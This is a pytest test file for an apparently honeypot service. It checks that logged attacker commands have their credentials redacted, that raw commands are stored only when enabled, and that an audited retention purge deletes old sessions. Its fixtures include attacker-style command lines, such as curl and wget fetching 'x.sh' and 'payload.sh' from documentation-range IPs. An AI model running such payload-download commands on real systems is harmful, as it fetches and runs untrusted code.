"""Command storage safeguards: what an attacker typed is stored with credentials redacted (raw text only on
request), and the retention purge is the one audited way to delete recorded sessions."""
import hashlib
import json
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import select

from app import retention, services
from app.config import Settings
from app.immutability import ImmutableError
from app.models import (
    AdminAuditEvent,
    AiSynthesis,
    ExecutionObservation,
    ExecutionRequest,
    GatewayEvent,
    HoneypotSession,
    SessionEvent,
    SessionOverlay,
)
from app.orchestration import session_manager as sm
from app.runtime.policy import ExecutionPolicy
from tests.fakes import FakeDriver

CANARIES = ["CANARY-PW-curl-1a", "CANARY-PW-env-2b", "CANARY-PW-url-3c", "CANARY-PW-flag-4d",
            "CANARYbearerToken0123456789abcd"]
COMMANDS = [
    f"curl -u admin:{CANARIES[0]} http://198.51.100.7/x.sh",
    f"export DB_PASSWORD={CANARIES[1]}",
    f"psql postgresql://shop:{CANARIES[2]}@db:5432/shop",
    f"mysqldump --password {CANARIES[3]} shop",
    f"curl -H 'Authorization: Bearer {CANARIES[4]}' http://198.51.100.7/api",
]


@pytest.fixture
def published(db):
    snap = services.create_draft_snapshot(db, None)
    services.validate_snapshot(db, snap)
    services.publish_snapshot(db, snap)
    db.commit()
    return snap


def make(session_factory, **kw):
    return sm.SessionManager(FakeDriver(), session_factory, ExecutionPolicy(), "hornet-twin-base:2", **kw)


def stored_text(session_factory) -> str:
    """Everything recorded, except stdout/stderr (execution evidence, stored as-is: a documented limit)."""
    with session_factory() as v:
        parts = []
        for model in (ExecutionRequest, SessionEvent, SessionOverlay, GatewayEvent, AdminAuditEvent, AiSynthesis):
            for row in v.scalars(select(model)):
                parts.append(json.dumps({c.key: str(getattr(row, c.key)) for c in model.__mapper__.column_attrs}))
        for obs in v.scalars(select(ExecutionObservation)):
            meta = {k: x for k, x in obs.result_metadata.items() if k not in ("stdout", "stderr")}
            parts.append(json.dumps(meta, default=str))
        return "\n".join(parts)


def test_commands_are_stored_with_credentials_redacted(published, session_factory):
    mgr = make(session_factory)
    s = mgr.create_session()
    for cmd in COMMANDS:
        mgr.execute(s.id, cmd, "interactive_input", stateful=True)
    text = stored_text(session_factory)
    assert not any(c in text for c in CANARIES)
    with session_factory() as v:
        reqs = list(v.scalars(select(ExecutionRequest).order_by(ExecutionRequest.created_at)))
    assert [r.input_hash for r in reqs] == [hashlib.sha256(c.encode()).hexdigest() for c in COMMANDS]
    assert all(r.input_raw is None for r in reqs)
    # the evidence around the secret survives: the tool, the user name, the address and the URL
    assert reqs[0].input_text.startswith("curl -u admin:<REDACTED:") and "http://198.51.100.7/x.sh" in reqs[0].input_text
    assert reqs[1].input_text.startswith("export DB_PASSWORD=<REDACTED:")
    assert "@db:5432/shop" in reqs[2].input_text


def test_ordinary_commands_are_stored_verbatim(published, session_factory):
    mgr = make(session_factory)
    s = mgr.create_session()
    cmd = "wget http://203.0.113.9/payload.sh -O /tmp/p && echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQK | base64 -d"
    mgr.execute(s.id, cmd)
    with session_factory() as v:
        assert v.scalars(select(ExecutionRequest)).one().input_text == cmd  # addresses and encoded payloads are evidence


def test_stored_text_is_capped(published, session_factory):
    mgr = sm.SessionManager(FakeDriver(), session_factory, ExecutionPolicy(input_limit_bytes=64), "hornet-twin-base:2")
    s = mgr.create_session()
    mgr.execute(s.id, "export TOKEN=" + "a1" * 20)  # redaction makes it longer than it was
    with session_factory() as v:
        text = v.scalars(select(ExecutionRequest)).one().input_text
    assert len(text) <= 64 + len("...[truncated]")


def test_raw_commands_only_when_enabled(published, session_factory):
    mgr = make(session_factory, store_raw_commands=True)
    s = mgr.create_session()
    mgr.execute(s.id, COMMANDS[1])
    with session_factory() as v:
        req = v.scalars(select(ExecutionRequest)).one()
    assert req.input_raw == COMMANDS[1] and CANARIES[1] not in req.input_text


def test_safe_defaults():
    s = Settings(admin_api_key="x" * 20, _env_file=None)
    assert s.store_raw_commands is False and s.gateway_log_passwords is False and s.retention_days == 30
    with pytest.raises(ValueError):
        Settings(admin_api_key="x" * 20, retention_days=0, _env_file=None)


# ---- retention -------------------------------------------------------------------------------------------------
def _session_with_everything(mgr, session_factory, days_ago: int):
    s = mgr.create_session()
    mgr.execute(s.id, "touch /tmp/x")
    mgr.destroy_session(s.id)
    ended = datetime.now(UTC) - timedelta(days=days_ago)
    with session_factory() as v:  # age the session; there is no API for that, so write the timestamps directly
        row = v.get(HoneypotSession, s.id)
        row.started_at, row.ended_at = ended - timedelta(minutes=5), ended
        req = v.scalars(select(ExecutionRequest).where(ExecutionRequest.session_id == s.id)).one()
        v.add(AiSynthesis(request_id=req.id, response_mode="proposal", validation_status="accepted", response_metadata={}))
        v.add(GatewayEvent(connection_id=s.id, session_id=s.id, source_ip="203.0.113.5", event_type="auth.password",
                           meta={"password_len": 3}, occurred_at=ended))
        v.commit()
    return s.id


def test_purge_removes_old_sessions_completely_and_is_audited(published, session_factory):
    mgr = make(session_factory)
    old = _session_with_everything(mgr, session_factory, days_ago=40)
    recent = _session_with_everything(mgr, session_factory, days_ago=2)
    live = mgr.create_session()
    with session_factory() as v:  # an old login attempt that never led to a session
        v.add(GatewayEvent(connection_id=old, source_ip="203.0.113.6", event_type="auth.password", meta={},
                           occurred_at=datetime.now(UTC) - timedelta(days=60)))
        v.commit()

    with session_factory() as db:
        counts = retention.purge(db, 30, "test-admin")
    assert counts["honeypot_session"] == 1 and counts["execution_request"] == 1 and counts["ai_synthesis"] == 1
    assert counts["gateway_event"] == 2

    with session_factory() as v:
        assert v.get(HoneypotSession, old) is None
        assert v.get(HoneypotSession, recent) is not None and v.get(HoneypotSession, live.id) is not None
        for model in (ExecutionRequest, SessionEvent, SessionOverlay, GatewayEvent):
            assert not list(v.scalars(select(model).where(model.session_id == old)))
        audit = v.scalars(select(AdminAuditEvent).where(AdminAuditEvent.action == "retention.purge")).one()
        assert audit.actor == "test-admin" and audit.detail["honeypot_session"] == 1


def test_purge_never_touches_live_sessions(published, session_factory):
    mgr = make(session_factory)
    live = mgr.create_session()
    with session_factory() as v:
        row = v.get(HoneypotSession, live.id)
        row.started_at = datetime.now(UTC) - timedelta(days=400)
        v.commit()
    with session_factory() as db:
        assert retention.purge(db, 1, "test-admin")["honeypot_session"] == 0
    with session_factory() as v:
        assert v.get(HoneypotSession, live.id) is not None


def test_evidence_is_still_append_only_outside_the_purge(published, session_factory):
    mgr = make(session_factory)
    s = mgr.create_session()
    mgr.execute(s.id, "touch /tmp/x")
    with session_factory() as v, pytest.raises(ImmutableError):
        v.delete(v.scalars(select(ExecutionObservation)).one())
        v.flush()
    with session_factory() as db, pytest.raises(ValueError):
        retention.purge(db, 0, "test-admin")
